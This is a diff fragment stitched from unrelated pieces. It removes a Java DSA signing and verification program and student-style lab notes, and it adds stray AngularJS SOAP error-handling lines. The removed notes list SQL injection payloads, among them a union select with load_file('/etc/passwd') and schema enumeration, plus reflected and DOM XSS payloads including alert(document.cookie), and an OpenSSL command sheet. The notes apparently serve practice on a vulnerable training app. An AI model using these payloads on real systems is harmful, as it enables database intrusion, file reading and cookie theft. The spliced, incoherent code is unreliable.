-        MessageDigest md = MessageDigest.getInstance("SHA-1");
-        byte[] messageDigest = md.digest(message.getBytes());
-        return new BigInteger(1, messageDigest).mod(q);  // Mod q to fit DSA range
-    }
-
-    // Signing the message
-    public static void sign(String message) throws Exception {
-        BigInteger hashedMessage = hashMessage(message);
-
-        do {
-            k = new BigInteger(q.bitLength(), random).mod(q);  // k must be < q
-        } while (k.equals(BigInteger.ZERO));
-
-        r = g.modPow(k, p).mod(q);  // r = (g^k mod p) mod q
-        s = (k.modInverse(q).multiply(hashedMessage.add(x.multiply(r)))).mod(q);  // s = k^-1 * (hash + x * r) mod q
-
-        System.out.println("\nSignature (r, s):");
-        System.out.println("r = " + r);
-        System.out.println("s = " + s);
-    }
-
-    // Verifying the signature
-    public static void verify(String message) throws Exception {
-        BigInteger hashedMessage = hashMessage(message);
-
-        BigInteger w = s.modInverse(q);  // w = s^-1 mod q
-        BigInteger u1 = (hashedMessage.multiply(w)).mod(q);  // u1 = hash * w mod q
-        BigInteger u2 = (r.multiply(w)).mod(q);  // u2 = r * w mod q
-        BigInteger v = ((g.modPow(u1, p).multiply(y.modPow(u2, p))).mod(p)).mod(q);  // v = (g^u1 * y^u2 mod p) mod q
-
-        System.out.println("\nComputed values:");
-        System.out.println("w = " + w);
-        System.out.println("u1 = " + u1);
-        System.out.println("u2 = " + u2);
-        System.out.println("v = " + v);
-
-        if (v.equals(r)) {
-            System.out.println("\nValid signature");
-        } else {
-            System.out.println("\nInvalid signature");
-        }
-    }
-
-    public static void main(String[] args) {
-        try {
-            generateParameters();
-
-            Scanner scanner = new Scanner(System.in);
-            System.out.print("\nEnter the message: ");
-            String message = scanner.nextLine();
-
-            sign(message); 
-            verify(message);  
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
 }
 
+}, function(error) {
 
+console.error('Error making SOAP request:', error);
 
+$scope.stockPrice = "Error fetching price.";
 
-LOW:
-1 = check expected result
-' or '1'='1 = check the results of an OR true statement
-1' ORDER BY 1;# = number of columns in the table
-' union select null,@@hostname# = hostname
-' union select load_file('/etc/passwd'),null# = display file
-
-MEDIUM:
-1 or 1=1 union select null, table_name from information_schema.tables# = all schema names
-1 union select null,@@version# = sql version
-
-XSS(Reflected):(LOW)
-Jalal<script>alert(100)</script>
-
-XSS(Reflected):(MEDIUM)
-Jalal<SCRIPT>alert(100)</script>
-
-XSS(DOM):(LOW)
-<script>alert(document.cookie)</script>
-
-XSS(DOM):(MEDIUM)
-</select><img src/alert(100)>
-</select><img src/onerror=alert(100)>
-.........................
-OPENSSL
-
-
-openssl aes-128-cbc -e -in plain.txt -out cipher.bin -k "password" -pbkdf2 -nosalt
-openssl aes-128-cbc -d -in cipher.bin -out pt.txt -k "password" -pbkdf2 –nosalt
-certutil -encodehex inputfile ouputfile
-openssl genrsa –out pvtkey.pem ---------gen pvt key
-openssl rsa -pubout -in pvtkey.pem -out pubkey.pem-----------gen pub key
-openssl rsa -text -in pvtkey.pem---------display
-openssl rsautl -encrypt -in plain.txt -pubin -inkey pubkey.pem -out c1.bin
-type c1.bin
-openssl pkeyutl -decrypt -in c1.bin -inkey pvtkey.pem -out decplaintext.txt
-Type decplaintext.txt
-openssl md5 plain.txt
-Openssl SHA256 plain.txt
-openssl dgst -sha1 -sign pvtkey.pem -out s.bin plain.txt
-openssl dgst -sha1 -verify pubkey.pem -signature s.bin plain.txt
+}); }; });
